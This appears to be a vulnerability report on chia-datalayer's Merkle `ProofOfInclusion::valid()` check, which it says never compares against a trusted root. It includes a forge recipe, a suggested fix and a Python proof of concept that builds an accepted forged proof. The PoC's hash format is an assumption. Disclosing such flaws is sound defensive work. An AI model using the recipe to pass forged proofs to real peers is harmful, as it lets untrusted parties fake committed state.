### Title
`ProofOfInclusion::valid()` Performs Only Self-Referential Consistency Check, Never Validates Against a Trusted External Root Hash — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` in the DataLayer Merkle proof module contains a tautological final check: it compares `existing_hash` against `self.root_hash()`, but `root_hash()` is derived from the proof's own last `combined_hash` field — the same value `existing_hash` was just set to inside the loop. The function therefore only verifies internal self-consistency of the proof object and never checks the computed root against any external, trusted tree root. An attacker who can supply a `ProofOfInclusion` (e.g., deserialized from bytes via the `Streamable` interface) can forge a proof for any claimed key-value pair that will unconditionally pass `valid()`.

### Finding Description

`ProofOfInclusion` and `ProofOfInclusionLayer` are both `Streamable` and exposed to Python via PyO3 bindings:

```rust
// crates/chia-datalayer/src/merkle/proof_of_inclusion.rs
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,   // attacker-controlled field
}

#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,       // attacker-controlled field
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

The `root_hash()` helper returns the `combined_hash` of the **last layer** — a field that is part of the proof itself:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // taken from the proof, not from a trusted source
    } else {
        self.node_hash
    }
}
```

The `valid()` function iterates through layers, checking that each `calculated_hash == layer.combined_hash`, and then performs the final check:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // existing_hash = layer.combined_hash
    }

    existing_hash == self.root_hash()      // TAUTOLOGY: both sides are last.combined_hash
}
```

After the loop exits normally, `existing_hash` equals the last `layer.combined_hash` (because the loop would have returned `false` otherwise). `self.root_hash()` also returns `last.combined_hash`. The final comparison is therefore always `true` when the loop completes — it is a tautology. No external trusted root hash is ever consulted.

**Forge recipe (attacker-controlled bytes):**
1. Choose any `node_hash` N (the hash of the claimed leaf).
2. Choose any `other_hash` O and `other_hash_side` S.
3. Compute `combined_hash` = `calculate_internal_hash(N, S, O)`.
4. Serialize as a `ProofOfInclusion` with one layer `{other_hash_side: S, other_hash: O, combined_hash: C}`.
5. Deserialize via `ProofOfInclusion::from_bytes()` and call `valid()` → returns `true`.

The proof is internally consistent but corresponds to no real tree root.

### Impact Explanation

The DataLayer uses Merkle proofs to let clients verify that a key-value pair is committed in an on-chain root hash. Any Python or Rust caller that receives a `ProofOfInclusion` from an untrusted peer and calls `proof.valid()` (or `proof_of_inclusion.valid()` in Python) to decide whether to trust the claimed state will accept a completely forged proof. This lets an untrusted peer prove arbitrary invalid state — matching the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."*

### Likelihood Explanation

`ProofOfInclusion` is `Streamable`, fully constructible from raw bytes, and its `valid()` method is exposed to Python via `py_valid()`. Any DataLayer client that verifies peer-supplied proofs using only `valid()` — without separately comparing `proof.root_hash()` against a locally-known trusted root — is exploitable by any network peer. The DataLayer is explicitly designed to exchange proofs between nodes, making this a reachable path for unprivileged input.

### Recommendation

`valid()` must accept an external trusted root hash and compare the computed root against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // compare against externally-supplied root
}
```

The existing `valid()` (which only checks internal consistency) should either be removed or clearly documented as insufficient for security purposes. All call sites — including the Python binding `py_valid()` — must be updated to supply the trusted root hash obtained from the on-chain commitment.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, Side
from chia_rs.datalayer import MerkleBlob, KeyId, ValueId

# Build a real tree with one entry
blob = MerkleBlob(bytearray())
real_key   = KeyId(1)
real_value = ValueId(100)
real_hash  = bytes([0xAA] * 32)
blob.insert(real_key, real_value, real_hash)
blob.calculate_lazy_hashes()
real_root = blob.get_root_hash()

# Forge a proof for a key that does NOT exist in the tree
fake_node_hash  = bytes([0xBB] * 32)   # hash of a non-existent leaf
other_hash      = bytes([0xCC] * 32)
# compute combined_hash = internal_hash(other_hash, fake_node_hash)
# (attacker computes this offline using calculate_internal_hash)
import hashlib
combined = hashlib.sha256(b'\x02' + other_hash + fake_node_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=Side.Left,   # other_hash is on the left
    other_hash=other_hash,
    combined_hash=combined,
)
forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True even though this proof has nothing to do with real_root
assert forged_proof.valid(), "Forged proof passes valid()!"
assert forged_proof.root_hash() != real_root, "Forged root differs from real root"
print("VULNERABILITY CONFIRMED: forged proof passes valid() without matching the real tree root")
